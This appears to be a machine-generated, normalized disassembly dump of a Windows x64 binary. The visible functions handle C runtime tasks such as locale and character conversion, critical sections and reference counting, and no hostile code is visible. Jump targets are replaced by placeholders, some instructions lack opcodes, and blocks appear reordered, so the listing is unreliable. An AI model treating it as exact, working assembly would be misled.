mov [ rsp + 0x20 ] 0x267
lea ecx [ rdx - 0x57 ]
lea r8d [ rdx - 0x25 ]
call sub_140035900
xor eax eax
jmp r-xdata
inc ebx
cmp ebx edi
jle r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_140037370
push rbp
push rsi
push r13
push r15
mov eax 0x38
call sub_14003d700
sub rsp rax
mov r13 r8
mov r15 rdx
xor esi esi
call sub_140036ef0
mov rbp rax
test rax rax
jne r-xdata
mov [ rsp + 0x60 ] rbx
mov edx 0x2
mov [ rsp + 0x68 ] rdi
lea r8 [ rw-data ]
lea ecx [ rdx + 0x3 ]
mov r9d 0x19d
mov [ rsp + 0x70 ] r12
mov [ r13 ] rsi
mov [ rsp + 0x30 ] r14
call sub_1400343a0
mov rcx [ rbp + 0x8 ]
call sub_140034cd0
movsxd r14 eax
mov r12 r14
test eax eax
jle r-xdata
add rsp 0x38
pop r15
pop r13
pop rsi
pop rbp
retn
mov edx 0x2
lea r8 [ rw-data ]
mov r9d 0x1a8
lea ecx [ rdx + 0x4 ]
call sub_1400343a0
test r14d r14d
mov r14 [ rsp + 0x30 ]
jle r-xdata
lea ecx [ r14 * 8 ]
lea rdx [ rw-data ]
mov r8d 0x1a1
call sub_140034910
mov rsi rax
test rax rax
je r-xdata
xor edi edi
xor ebx ebx
test r12 r12
jle r-xdata
test rsi rsi
jne r-xdata
xor edi edi
xor ebx ebx
test r14d r14d
jle r-xdata
test rsi rsi
je r-xdata
mov rax [ rsi + rbx * 8 ]
test rax rax
je r-xdata
lea r9 [ rw-data ]
lea edx [ rsi + 0x6c ]
lea ecx [ rsi + 0xf ]
lea r8d [ rsi + 0x41 ]
mov [ rsp + 0x20 ] 0x1ab
call sub_140035900
xor eax eax
jmp r-xdata
mov rcx [ rbp + 0x8 ]
mov edx edi
call sub_140034ce0
inc rbx
inc edi
mov [ rsi + rbx * 8 - 0x8 ] rax
cmp rbx r14
jl r-xdata
mov eax 0x1
mov rcx rsi
call sub_140034a90
inc rbx
inc edi
cmp rbx r12
jl r-xdata
cmp [ rax + 0x10 ] 0x0
je r-xdata
mov rdi [ rsp + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov r12 [ rsp + 0x70 ]
add rsp 0x38
pop r15
pop r13
pop rsi
pop rbp
retn
mov rcx [ r13 ]
test rcx rcx
jne r-xdata
call sub_140034cd0
cmp edi eax
jl r-xdata
xor eax eax
jmp r-xdata
mov rcx [ r13 ]
mov edx edi
call sub_140034ce0
xor eax eax
jmp r-xdata
mov r10 [ rsi + rbx * 8 ]
mov r9d edi
mov r8 r13
mov rcx [ r10 + 0x8 ]
mov rdx rax
mov [ rsp + 0x28 ] rcx
mov ecx [ r10 ]
mov [ rsp + 0x20 ] ecx
mov rcx r15
call [ r10 + 0x10 ]
sub_140037520
push rbp
push rsi
push r14
mov eax 0x40
call sub_14003d700
sub rsp rax
xor esi esi
mov rbp r8
mov r14 rdx
cmp [ r8 ] rsi
jne r-xdata
mov [ rsp + 0x78 ] r12
call sub_140036ef0
mov r12 rax
test rax rax
jne r-xdata
lea eax [ rsi + 0x1 ]
add rsp 0x40
pop r14
pop rsi
pop rbp
retn
mov [ rsp + 0x60 ] rbx
mov edx 0x2
mov [ rsp + 0x68 ] rdi
lea r8 [ rw-data ]
lea ecx [ rdx + 0x3 ]
mov r9d 0x1c9
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] r15
call sub_1400343a0
mov rcx [ r12 + 0x8 ]
call sub_140034cd0
mov rcx [ rbp ]
mov r15d eax
call sub_140034cd0
cmp eax r15d
cmovl r15d eax
movsxd r13 r15d
test r15d r15d
jle r-xdata
mov r12 [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop rsi
pop rbp
retn
mov edx 0x2
lea r8 [ rw-data ]
mov r9d 0x1d7
lea ecx [ rdx + 0x4 ]
call sub_1400343a0
test r15d r15d
mov r15 [ rsp + 0x30 ]
jle r-xdata
lea ecx [ r15 * 8 ]
lea rdx [ rw-data ]
mov r8d 0x1d0
call sub_140034910
mov rsi rax
test rax rax
je r-xdata
xor ebx ebx
xor edi edi
test r13 r13
jle r-xdata
test rsi rsi
jne r-xdata
xor edi edi
xor ebx ebx
test r15d r15d
jle r-xdata
test rsi rsi
je r-xdata
mov rcx [ rbp ]
test rcx rcx
jne r-xdata
lea r9 [ rw-data ]
lea edx [ rsi + 0x6a ]
lea ecx [ rsi + 0xf ]
lea r8d [ rsi + 0x41 ]
mov [ rsp + 0x20 ] 0x1da
call sub_140035900
xor eax eax
jmp r-xdata
nop [ rax ] eax
mov eax 0x1
mov rcx rsi
call sub_140034a90
call sub_140034cd0
cmp ebx eax
jl r-xdata
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
mov r13 [ rsp + 0x38 ]
mov r12 [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop rsi
pop rbp
retn
mov rcx [ r12 + 0x8 ]
mov edx edi
call sub_140034ce0
inc rbx
inc edi
mov [ rsi + rbx * 8 - 0x8 ] rax
cmp rbx r13
jl r-xdata
mov rcx [ rbp ]
mov edx ebx
call sub_140034ce0
xor eax eax
jmp r-xdata
mov [ rsp + 0x70 ] rax
mov rcx [ rsi + rdi * 8 ]
test rcx rcx
je r-xdata
mov r8 rax
mov edx ebx
mov rcx r14
call sub_140037290
inc rdi
inc ebx
cmp rdi r13
jl r-xdata
cmp [ rcx + 0x20 ] 0x0
je r-xdata
mov rax [ rcx + 0x8 ]
mov r10 rcx
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] rax
mov eax [ rcx ]
mov r9d ebx
mov rdx rbp
mov rcx r14
mov [ rsp + 0x20 ] eax
call [ r10 + 0x20 ]
mov rax [ rsp + 0x70 ]
sub_140037710
push rbp
push rsi
push r12
push r15
mov eax 0x38
call sub_14003d700
sub rsp rax
mov rbp r8
mov r15 rdx
xor esi esi
call sub_140036ef0
mov r12 rax
test rax rax
je r-xdata
add rsp 0x38
pop r15
pop r12
pop rsi
pop rbp
retn
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rdi
lea r8 [ rw-data ]
lea edx [ rsi + 0x2 ]
lea ecx [ rsi + 0x5 ]
mov r9d 0x1f4
mov [ rsp + 0x70 ] r13
mov [ rsp + 0x30 ] r14
call sub_1400343a0
mov rcx [ r12 + 0x8 ]
call sub_140034cd0
movsxd r14 eax
mov r13 r14
test eax eax
jle r-xdata
mov edx 0x2
lea r8 [ rw-data ]
mov r9d 0x1ff
lea ecx [ rdx + 0x4 ]
call sub_1400343a0
test r14d r14d
mov r14 [ rsp + 0x30 ]
jle r-xdata
lea ecx [ r14 * 8 ]
lea rdx [ rw-data ]
mov r8d 0x1f8
call sub_140034910
mov rsi rax
test rax rax
je r-xdata
xor edi edi
xor ebx ebx
test r13 r13
jle r-xdata
test rsi rsi
jne r-xdata
xor edi edi
xor ebx ebx
test r14d r14d
jle r-xdata
test rsi rsi
je r-xdata
mov rax [ rsi + rbx * 8 ]
test rax rax
je r-xdata
lea r9 [ rw-data ]
lea edx [ rsi + 0x6b ]
lea ecx [ rsi + 0xf ]
lea r8d [ rsi + 0x41 ]
mov [ rsp + 0x20 ] 0x202
call sub_140035900
jmp r-xdata
nop [ rax + rax ] eax
mov rcx [ rbp ]
test rcx rcx
je r-xdata
mov rcx rsi
call sub_140034a90
inc rbx
inc edi
cmp rbx r13
jl r-xdata
cmp [ rax + 0x18 ] 0x0
je r-xdata
mov rdi [ rsp + 0x68 ]
mov rbx [ rsp + 0x60 ]
mov r13 [ rsp + 0x70 ]
mov rcx [ r12 + 0x8 ]
mov edx edi
call sub_140034ce0
inc rbx
inc edi
mov [ rsi + rbx * 8 - 0x8 ] rax
cmp rbx r14
jl r-xdata
call sub_140034c90
mov [ rbp ] 0x0
mov rcx [ rbp ]
test rcx rcx
jne r-xdata
call sub_140034cd0
cmp edi eax
jl r-xdata
xor eax eax
jmp r-xdata
mov rcx [ rbp ]
mov edx edi
call sub_140034ce0
xor eax eax
jmp r-xdata
mov r10 [ rsi + rbx * 8 ]
mov r9d edi
mov r8 rbp
mov rcx [ r10 + 0x8 ]
mov rdx rax
mov [ rsp + 0x28 ] rcx
mov ecx [ r10 ]
mov [ rsp + 0x20 ] ecx
mov rcx r15
call [ r10 + 0x18 ]
sub_1400379a4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_14003a7e8
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_1400379dc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x10 ] dx
push rdi
sub rsp 0x40
mov rsi rcx
test r9 r9
jne r-xdata
mov ebx [ r9 ]
mov edi [ r9 + 0x4 ]
call sub_14003f768
mov ebx [ rax + 0x8 ]
call sub_14003f730
movzx edx [ rsp + 0x58 ]
mov edi eax
jmp r-xdata
and [ rsp + 0x68 ] 0x0
mov ecx edi
call sub_140038444
mov rcx rax
call sub_14003f71c
lea rcx [ rsp + 0x68 ]
lea r8 [ rsp + 0x58 ]
mov [ rsp + 0x38 ] rcx
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] eax
mov ecx edi
mov r9d 0x1
xor edx edx
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov eax 0xff
cmp dx ax
ja r-xdata
test ebx ebx
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x2a
or eax 0xffffffff
cmp [ rsp + 0x68 ] 0x0
je r-xdata
mov [ rsi ] dl
lea eax [ rbx + 0x1 ]
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_140037ac8
push rbx
sub rsp 0x30
mov rax [ rcx ]
mov rbx r8
mov r8d edx
lea rdx [ rsp + 0x20 ]
call [ rax + 0x18 ]
mov rcx [ rbx + 0x8 ]
cmp [ rax + 0x8 ] rcx
jne r-xdata
xor eax eax
mov ecx [ rbx ]
cmp [ rax ] ecx
jne r-xdata
mov eax 0x1
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_140037b54
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
and [ rsp + 0x38 ] 0x0
mov ecx r8d
mov rdi rdx
call sub_14003e924
and [ rdi + 0x10 ] 0x0
mov [ rdi + 0x18 ] 0xf
mov rcx rax
mov rbx rax
mov [ rdi ] 0x0
call sub_14003f7f0
mov rdx rbx
mov rcx rdi
mov r8 rax
call sub_140005c90
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_140037ba8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
mov rdi rdx
cmp r8d 0x1
jne r-xdata
mov ecx r8d
call sub_14003e924
and [ rdi + 0x10 ] 0x0
mov [ rdi + 0x18 ] 0xf
mov rcx rax
mov rbx rax
mov [ rdi ] 0x0
call sub_14003f7f0
mov rdx rbx
and [ rdx + 0x10 ] 0x0
mov [ rdx + 0x18 ] 0xf
lea rcx [ r--data ]
mov [ rdx ] 0x0
call sub_14003f7f0
lea rdx [ r--data ]
jmp r-xdata
mov r8 rax
mov rcx rdi
call sub_140005c90
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_140037c24
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx [ rcx + 0x38 ]
mov rdi rcx
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8d [ rbx + 0x8 ]
mov rdx rdi
xor ecx ecx
call [ rbx + 0x10 ]
mov rbx [ rbx ]
mov rcx [ rdi + 0x30 ]
test rcx rcx
je r-xdata
mov rcx [ rdi + 0x38 ]
and [ rdi + 0x30 ] 0x0
test rcx rcx
je r-xdata
mov rbx [ rcx ]
call j_sub_14003ad04
mov rcx rbx
test rbx rbx
jne r-xdata
and [ rdi + 0x38 ] 0x0
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rbx [ rcx ]
call j_sub_14003ad04
mov rcx rbx
test rbx rbx
jne r-xdata
sub_140037c94
push rbx
sub rsp 0x20
mov rbx rcx
lea rcx [ rsp + 0x30 ]
mov edx 0x2
call sub_14003825c
mov [ rbx + 0x8 ] 0x1
lea rdx [ __dos_header ]
mov rax [ rbx + 0x8 ]
lea rcx [ rsp + 0x30 ]
mov [ rdx + rax * 8 + 0x954d0 ] rbx
mov rax [ rbx + 0x8 ]
inc [ rdx + rax + 0x95520 ]
call sub_14003828c
add rsp 0x20
pop rbx
retn
cmp rcx rbx
je r-xdata
inc rax
mov [ rbx + 0x8 ] rax
cmp rax 0x8
jb r-xdata
mov rax [ rbx + 0x8 ]
mov rcx [ rdx + rax * 8 + 0x954d0 ]
test rcx rcx
je r-xdata
sub_140037d08
push rbx
sub rsp 0x20
cmp [ rcx + 0x8 ] 0x0
mov rbx rcx
jbe r-xdata
mov rcx rbx
call sub_140037c24
mov rbx [ rbx + 0x40 ]
test rbx rbx
je r-xdata
mov rax [ rbx + 0x8 ]
lea rcx [ rw-data ]
dec [ rcx + rax ]
cmp [ rcx + rax ] 0x0
jg r-xdata
add rsp 0x20
pop rbx
retn
mov rcx rbx
call sub_140002af0
mov rcx rbx
call j_sub_14003ad04
sub_140037d54
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx + 0x8 ]
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
xor ebx ebx
lea rcx [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
sub_140037db8
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x10
call sub_14003ac60
test rax rax
je r-xdata
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
mov rdx [ rw-data ]
mov [ rax + 0x8 ] rbx
mov [ rax ] rdx
sub_140037dec
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx [ rcx ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rcx [ rsp + 0x30 ]
xor edx edx
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
xor edi edi
lea rcx [ rsp + 0x30 ]
cmp [ rbx + 0x8 ] rdi
cmove rdi rbx
call sub_14003828c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
sub_140037ec4
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rdi rcx
xor edx edx
lea rcx [ rsp + 0x58 ]
call sub_14003825c
nop
mov rbx [ rdi + 0x18 ]
jmp r-xdata
test rbx rbx
jne r-xdata
dec rbx
mov rax [ rdi + 0x10 ]
cmp [ rax + rbx * 8 ] 0x0
je r-xdata
mov rcx [ rdi + 0x10 ]
call sub_14003ad04
nop
lea rcx [ rsp + 0x58 ]
call sub_14003828c
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
mov rbp [ rax + rbx * 8 ]
xor edx edx
lea rcx [ rsp + 0x50 ]
call sub_14003825c
mov rax [ rbp + 0x8 ]
test rax rax
je r-xdata
xor esi esi
cmp [ rbp + 0x8 ] rsi
cmove rsi rbp
lea rcx [ rsp + 0x50 ]
call sub_14003828c
test rsi rsi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax [ rsi ]
mov edx 0x1
mov rcx rsi
call [ rax ]
dec rax
mov [ rbp + 0x8 ] rax
sub_140037f8c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rsi rcx
mov rcx [ rcx ]
mov rbx rdx
cmp rcx rdx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rax rsi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
test rcx rcx
je r-xdata
and [ rsi ] 0x0
test rbx rbx
je r-xdata
call sub_14003ad04
cmp [ rbx ] 0x0
mov rdi rbx
je r-xdata
sub rdi rbx
lea rcx [ rdi + 0x1 ]
call sub_14003ae78
mov [ rsi ] rax
test rax rax
je r-xdata
inc rdi
cmp [ rdi ] 0x0
jne r-xdata
lea r8 [ rdi + 0x1 ]
mov rdx rbx
mov rcx rax
call sub_14003a8c0
sub_140038004
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
xor edx edx
xor ecx ecx
call sub_14003ce60
lea rcx [ r--data ]
test rax rax
cmove rax rcx
lea rcx [ rdi + 0x28 ]
mov rdx rax
call sub_140037f8c
test rbx rbx
je r-xdata
lea rax [ r--data ]
test rbx rbx
lea rcx [ rdi + 0x38 ]
cmove rbx rax
mov rdx rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp sub_140037f8c
mov rdx rbx
xor ecx ecx
call sub_14003ce60
mov rbx rax
sub_140038070
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov edi edx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
call sub_140037ec4
nop
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
and [ rbx + 0x28 ] 0x0
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
call sub_14003ad04
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call j_sub_14003ad04
sub_1400380d8
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
mov rax rbx
add rsp 0x30
pop rbx
retn
xor edx edx
lea rcx [ rsp + 0x48 ]
call sub_14003825c
nop
mov rbx [ rw-data ]
test rbx rbx
jne r-xdata
lea rcx [ rsp + 0x48 ]
call sub_14003828c
lea ecx [ rbx + 0x38 ]
call sub_14003ac60
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax + 0x8 ] 0x1
lea rax [ r--data ]
mov [ rbx ] rax
and [ rbx + 0x10 ] 0x0
and [ rbx + 0x18 ] 0x0
and [ rbx + 0x20 ] 0x0
mov [ rbx + 0x24 ] 0x0
lea rcx [ rbx + 0x28 ]
and [ rcx ] 0x0
mov [ rcx + 0x8 ] 0x0
lea rdx [ r--data ]
call sub_140037f8c
jmp r-xdata
lea rcx [ rsp + 0x40 ]
call sub_14003828c
mov r11 [ rw-data ]
mov [ rw-data ] r11
inc rcx
mov [ rbx + 0x8 ] rcx
mov rcx rbx
call sub_140037e90
mov [ rbx + 0x20 ] 0x3f
lea rcx [ rbx + 0x28 ]
lea rdx [ r--data ]
call sub_140037f8c
mov [ rw-data ] rbx
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_14003825c
mov rcx [ rbx + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
sub_1400381d4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
[ rw-data ]
jne r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rdi [ rw-data ]
mov esi 0x4
mov rcx rdi
call InitializeCriticalSection
add rdi 0x28
dec rsi
jne r-xdata
sub_140038220
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
[ rw-data ] 0xffffffff
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rbx [ rw-data ]
mov edi 0x4
mov rcx rbx
call DeleteCriticalSection
add rbx 0x28
dec rdi
jne r-xdata
sub_14003825c
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx ] edx
cmp edx 0x4
jge r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
movsxd rax edx
lea rdx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rdx * 8 ]
call EnterCriticalSection
sub_140038314
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rax rdx
mov edx 0xffff
mov [ rsp + 0x50 ] cx
cmp cx dx
je r-xdata
movzx eax cx
add rsp 0x38
retn
cmp [ rax ] 0x0
mov edx 0x100
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov r9d 0x1
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] rcx
mov ecx [ rax ]
call sub_1400413fc
movzx ecx [ rsp + 0x50 ]
test eax eax
cmove cx [ rsp + 0x40 ]
cmp cx dx
jae r-xdata
lea eax [ rcx - 0x41 ]
cmp ax 0x19
ja r-xdata
add cx 0x20
jmp r-xdata
sub_140038384
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rax rdx
mov edx 0xffff
mov [ rsp + 0x50 ] cx
cmp cx dx
je r-xdata
movzx eax cx
add rsp 0x38
retn
cmp [ rax ] 0x0
jne r-xdata
lea rcx [ rsp + 0x50 ]
mov r9d 0x1
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] rcx
mov ecx [ rax ]
mov edx 0x200
call sub_1400413fc
movzx ecx [ rsp + 0x50 ]
test eax eax
cmove cx [ rsp + 0x40 ]
mov edx 0x100
cmp cx dx
jae r-xdata
lea eax [ rcx - 0x61 ]
cmp ax 0x19
ja r-xdata
sub cx 0x20
jmp r-xdata
sub_1400383f8
sub rsp 0x58
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
mov r9d 0xa
lea rdx [ rsp + 0x21 ]
mov ecx ecx
lea r8d [ r9 + 0x15 ]
mov [ rsp + 0x20 ] 0x2e
call sub_140041670
lea rdx [ rsp + 0x20 ]
xor ecx ecx
call sub_14003cd28
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x58
retn
sub_140038444
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov eax 0x8421085
mov r8d ecx
mov r12d ecx
mov ebp ecx
lea r13 [ rw-data ]
mul ecx
sub r8d edx
shr r8d 0x1
add r8d edx
shr r8d 0x5
imul r8d r8d 0x3e
sub r12d r8d
xor ebx ebx
test rbx rbx
jne r-xdata
cmp [ rdi + 0x8 ] ebp
je r-xdata
mov [ rbx ] rsi
mov rax rsi
[ r13 + r12 * 8 ] rbx
jne r-xdata
lea ecx [ rbx + 0x18 ]
call sub_140041684
mov rbx rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
mov rdi [ rdi ]
test rdi rdi
jne r-xdata
mov rsi [ r13 + r12 * 8 ]
mov rdi rsi
test rsi rsi
je r-xdata
mov rax [ rbx + 0x10 ]
xor eax eax
jmp r-xdata
mov ecx ebp
call sub_1400383f8
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
mov rax [ rdi + 0x10 ]
jmp r-xdata
mov rcx [ rbx + 0x10 ]
call sub_14003c084
mov rcx rbx
call sub_14003ad04
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov rcx rbx
call sub_14003ad04
mov [ rbx + 0x8 ] ebp
sub_140038520
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rdi [ rw-data ]
mov esi 0x3e
add rdi 0x8
dec rsi
jne r-xdata
mov rcx [ rbp + 0x10 ]
mov rbx [ rbp ]
call sub_14003c084
mov rcx rbp
call sub_14003ad04
mov rbp rbx
test rbx rbx
jne r-xdata
xor ebp ebp
xchg [ rdi ] rbp
test rbp rbp
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_1400385a4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
xor r15d r15d
mov r12 r9
mov r14 r8
mov rdi rdx
mov rsi rcx
test rdx rdx
je r-xdata
xor eax eax
test r8 r8
je r-xdata
cmp [ rdx ] r15b
jne r-xdata
mov rax [ rsp + 0x80 ]
test rax rax
jne r-xdata
test rcx rcx
je r-xdata
mov ebx [ rax ]
mov r13d [ rax + 0x4 ]
call sub_14003f768
mov ebx [ rax + 0x8 ]
call sub_14003f730
mov r13d eax
jmp r-xdata
mov [ rcx ] r15w
mov ecx r13d
call sub_140038444
mov rbp rax
cmp [ r12 ] r15d
je r-xdata
test rsi rsi
je r-xdata
test ebx ebx
jne r-xdata
test rax rax
jne r-xdata
mov cl [ rdi ]
mov [ r12 + 0x1 ] cl
mov rcx rax
call sub_14003f71c
cmp eax 0x1
jle r-xdata
mov eax 0x1
jmp r-xdata
movzx eax [ rdi ]
mov [ rsi ] ax
movzx ecx [ rdi ]
mov rax [ rax + 0x8 ]
movzx edx [ rax + rcx + 0x1d ]
and edx 0x4
call sub_140041898
movzx ecx [ rdi ]
movzx edx [ rax + rcx * 2 ]
and edx 0x8000
jmp r-xdata
mov [ r12 ] r15d
mov ecx r15d
mov r9d 0x2
test rsi rsi
setne cl
lea edx [ r9 + 0x7 ]
mov r8 r12
mov [ rsp + 0x28 ] ecx
mov ecx r13d
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov eax r15d
mov r9d 0x1
test rsi rsi
setne al
lea edx [ r9 + 0x8 ]
mov r8 rdi
mov [ rsp + 0x28 ] eax
mov ecx r13d
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx rbp
call sub_14003f71c
movsxd rcx eax
cmp r14 rcx
jae r-xdata
test edx edx
je r-xdata
mov [ r12 ] r15d
jmp r-xdata
mov rcx rbp
call sub_14003f71c
cmp eax 0x1
jle r-xdata
mov al [ rdi ]
mov [ r12 ] al
mov eax 0xfffffffe
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ rdi + 0x1 ] r15b
jne r-xdata
test rsi rsi
mov rcx rbp
mov ebx r15d
setne bl
call sub_14003f71c
mov r8 rdi
mov edx 0x9
mov ecx r13d
mov r9d eax
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov rcx rbp
call sub_14003f71c
jmp r-xdata
jmp r-xdata
sub_140038790
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x50
mov rdi rdx
movsxd rbx ecx
test rdx rdx
jne r-xdata
mov esi [ rdx ]
mov ebp [ rdx + 0x4 ]
call sub_14003f768
mov esi [ rax + 0x8 ]
call sub_14003f730
mov ebp eax
jmp r-xdata
cmp ebx 0x100
jae r-xdata
lea eax [ rbx - 0x41 ]
cmp eax 0x19
ja r-xdata
test esi esi
jne r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
jne r-xdata
mov eax ebx
jmp r-xdata
add ebx 0x20
mov eax ebx
sar rax 0x8
movzx ecx al
mov rax [ rdi + 0x8 ]
movsx edx [ rax + rcx * 2 ]
shr edx 0xf
and edx 0x1
call sub_140041898
mov ecx ebx
sar ecx 0x8
movzx ecx cl
movzx edx [ rax + rcx * 2 ]
and edx 0x8000
jmp r-xdata
mov rax [ rdi + 0x8 ]
test [ rax + rbx * 2 ] 0x1
je r-xdata
mov ecx ebx
call sub_14003e450
test eax eax
jne r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
mov [ rsp + 0x78 ] bl
mov [ rsp + 0x79 ] 0x0
mov eax 0x1
mov eax ebx
mov [ rsp + 0x79 ] bl
mov [ rsp + 0x7a ] 0x0
sar eax 0x8
mov [ rsp + 0x78 ] al
mov eax 0x2
jmp r-xdata
test edx edx
je r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ rsp + 0x80 ]
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x38 ] ebp
lea rcx [ rsp + 0x80 ]
mov [ rsp + 0x30 ] 0x3
mov [ rsp + 0x28 ] rcx
lea r9 [ rsp + 0x78 ]
xor ecx ecx
mov r8d 0x100
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_140041ba0
test eax eax
je r-xdata
movzx ecx [ rsp + 0x81 ]
